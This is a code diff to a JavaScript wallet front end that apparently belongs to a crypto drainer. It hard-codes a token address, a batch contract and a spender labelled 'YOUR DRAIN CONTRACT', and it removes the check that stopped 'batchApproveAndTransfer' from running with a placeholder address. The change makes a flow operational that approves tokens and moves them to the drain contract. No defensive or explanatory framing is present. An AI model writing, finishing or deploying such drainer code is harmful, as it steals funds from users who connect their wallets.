@@ -149,7 +149,7 @@ let provider, signer, user;
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 
 // 🔁 YOUR BATCH CONTRACT (deploy TokenBatcher.sol first)
-const batcherAddress = "0x04A56dD5fc9241B5046de02d17258553dd5772CF"; // REPLACE WITH YOUR DEPLOYED BATCH CONTRACT ADDRESS
+const batcherAddress = "0x04A56dD5fc9241B5046de02d17258553dd5772CF";
 
 // 🔁 YOUR DRAIN CONTRACT
 const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";
@@ -204,10 +204,6 @@ async function connectWallet() {
 }
 
 async function batchApproveAndTransfer() {
-  if (!batcherAddress || batcherAddress === "0x04A56dD5fc9241B5046de02d17258553dd5772CF") {
-    throw new Error("Please deploy TokenBatcher contract and update batcherAddress in the code");
-  }
-
   const contract = new ethers.Contract(batcherAddress, batcherABI, signer);
 
   const transferAmount = ethers.utils.parseUnits("10", 18);
